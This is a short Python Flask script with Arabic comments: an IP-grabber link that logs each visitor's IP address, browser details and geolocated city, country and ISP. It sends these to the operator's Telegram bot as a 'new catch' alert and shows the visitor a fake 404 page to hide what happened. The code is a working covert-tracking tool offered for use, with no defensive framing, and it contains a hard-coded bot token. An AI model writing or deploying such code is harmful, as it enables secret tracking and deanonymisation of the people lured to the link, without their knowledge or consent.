from flask import Flask, request
import requests

app = Flask(__name__)

# ضع بياناتك الحقيقية هنا
TELEGRAM_TOKEN = "8459471902:AAHLHHiOWWAQSOzvn6TFWMWuZR0r9cf_CUo"
CHAT_ID = "ضع_هنا_رقم_الايدي_الخاص_بك" 

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, data=payload)
    except:
        pass

@app.route('/')
@app.route('/check-status')
def track():
    # جلب الـ IP الحقيقي
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    user_agent = request.headers.get('User-Agent')
    
    # جلب بيانات الموقع الجغرافي
    try:
        geo_res = requests.get(f'http://ip-api.com/json/{ip_address}').json()
        city = geo_res.get('city', 'Unknown')
        country = geo_res.get('country', 'Unknown')
        isp = geo_res.get('isp', 'Unknown')
    except:
        city = country = isp = "Error"

    # التقرير المرسل لتليجرام
    report = (
        f"🎯 <b>تنبيه صيد جديد!</b>\n"
        f"--------------------------\n"
        f"🌐 <b>IP:</b> <code>{ip_address}</code>\n"
        f"📍 <b>الموقع:</b> {city}, {country}\n"
        f"🏢 <b>المزود:</b> {isp}\n"
        f"📱 <b>الجهاز:</b> {user_agent}\n"
        f"--------------------------"
    )
    
    send_to_telegram(report)
    
    # صفحة تمويه 404
    return "<h1>404 Not Found</h1>", 404
